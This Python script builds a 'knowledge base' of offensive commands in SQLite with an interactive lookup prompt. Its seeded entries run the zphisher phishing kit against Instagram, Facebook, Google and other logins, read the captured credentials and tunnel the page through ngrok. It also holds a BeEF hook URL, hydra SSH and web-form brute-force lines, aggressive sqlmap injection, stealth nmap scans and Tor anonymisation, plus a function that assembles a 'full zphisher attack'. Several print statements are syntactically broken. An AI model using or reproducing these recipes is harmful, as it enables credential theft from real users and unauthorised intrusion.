#!/usr/bin/env python3
"""
R.O.N.... Knowledge Base - Task-Specific Commands + Methods
Helps during phishing, nmap, sqlmap, hydra, etc
Location: /root/R.O.N/knowledge.py
INTEGRATES with ron.py automatically
"""

import sqlite3
import os
from pathlib import Path
from datetime import datetime

class RONKnowledge:
    def __init__(self, db_path="/root/R.O.N/ron.db"):
        self.db_path = Path(db_path)
        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
        self.init_knowledge()
    
    def init_knowledge(self):
        """Pre-load PHISHING + PENTEST knowledge"""
        knowledge = [
            # PHISHING TASKS
            ("phishing", "zphisher setup", "git clone https://github.com/htr-tech/zphisher.git && cd Zphisher && bash zphisher.sh", "github", 1),
            ("phishing", "common templates", "instagram facebook google linkedin github", "local", 1),
            ("phishing", "check credentials", "tail -f Zphisher/logins.txt | grep SUCCESS", "local", 1),
            ("phishing", "tunnel ngrok", "./ngrok http 3333", "ngrok", 1),
            
            # NMAP TASKS
            ("nmap", "stealth scan", "nmap -sS -T2 --randomize-hosts -Pn target", "stealth", 1),
            ("nmap", "full service scan", "nmap -sV -sC -O -p- target", "discovery", 1),
            ("nmap", "udp scan", "nmap -sU --top-ports 100 target", "udp", 1),
            
            # SQLMAP TASKS
            ("sqlmap", "basic injection", "sqlmap -u 'http://target.com?id=1' --batch --dbs", "basic", 1),
            ("sqlmap", "post data", "sqlmap -u 'http://target/login' --data='user=1&pass=1' --risk=3 --level=5", "post", 1),
            
            # HYDRA TASKS
            ("hydra", "ssh brute", "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target", "ssh", 1),
            ("hydra", "http post", "hydra -l admin -P rockyou.txt target.com http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'", "web", 1),
            
            # BE EF TASKS
            ("beef", "start beef", "beef-xss", "beef", 1),
            ("beef", "hook url", "http://YOUR_IP:3000/hook.js", "hook", 1),
            
            # GENERAL
            ("linux", "tor quick", "apt install tor proxychains && service tor start", "anon", 1),
            ("linux", "wordlist", "gunzip /usr/share/wordlists/dirb/common.txt.gz", "wordlists", 1)
        ]
        
        cursor = self.conn.execute("SELECT query FROM knowledge WHERE success=1")
        existing = {row[0] for row in cursor}
        
        with self.conn:
            for category, query, answer, source, success in knowledge:
                if query not in existing:
                    self.conn.execute(
                        "INSERT INTO knowledge (category, query, answer, source, success) VALUES (?, ?, ?, ?, ?)",
                        (category, query, answer, source, success)
                    )
        print("🧠 Knowledge base loaded: phishing, nmap, sqlmap, hydra, beef")
    
    def get_task_help(self, task_name):
        """Get commands for specific task"""
        cursor = self.conn.execute(
            "SELECT query, answer FROM knowledge WHERE category=? OR query LIKE ? ORDER BY success DESC LIMIT 5",
            (task_name, f"%{task_name}%")
        )
        
        results = []
        for row in cursor:
            results.append({
                "query": row[0],
                "command": row[1],
                "category": task_name
            })
        return results
    
    def suggest_command(self, partial_cmd):
        """Smart command completion"""
        cursor = self.conn.execute(
            "SELECT answer FROM knowledge WHERE answer LIKE ? LIMIT 3",
            (f"%{partial_cmd}%",)
        )
        return [row[0] for row in cursor.fetchall()]
    
    def add_custom(self, category, query, command, source="manual"):
        """Add your own commands"""
        with self.conn:
            self.conn.execute(
                "INSERT INTO knowledge (category, query, answer, source, success) VALUES (?, ?, ?, ?, 1)",
                (category, query, command, source)
            )
        print(f"✅ Added: {category}/{query}")

# PHISHING EXAMPLE INTEGRATION
def phishing_helper():
    """Complete phishing workflow"""
    kb = RONKnowledge()
    
    print("
🕵️ PHISHING TASK HELP:")
    phishing_cmds = kb.get_task_help("phishing")
    
    for cmd in phishing_cmds:
        print(f"💡 {cmd['query']}: {cmd['command']}")
    
    # Auto-generate phishing mission
    kb.add_custom("phishing", "full zphisher attack", 
                  "cd Zphisher && bash zphisher.sh && tail -f logins.txt", "auto")

def main():
    kb = RONKnowledge()
    
    print("
🧠 R.O.N KNOWLEDGE BASE")
    print("Available: phishing, nmap, sqlmap, hydra, beef, linux")
    
    while True:
        cmd = input("
KB> ").strip()
        
        if cmd == 'quit': break
        elif cmd == 'phishing': 
            phishing_helper()
        elif cmd.startswith('help '):
            task = cmd[5:]
            cmds = kb.get_task_help(task)
            for c in cmds:
                print(f"💡 {c['query']}: {c['command']}")
        elif cmd.startswith('add '):
            parts = cmd[4:].split(' ', 2)
            kb.add_custom(parts[0], parts[1], parts[2])
        else:
            print("Use: help phishing | help nmap | add category 'query' 'command'")

if __name__ == "__main__":
    main()
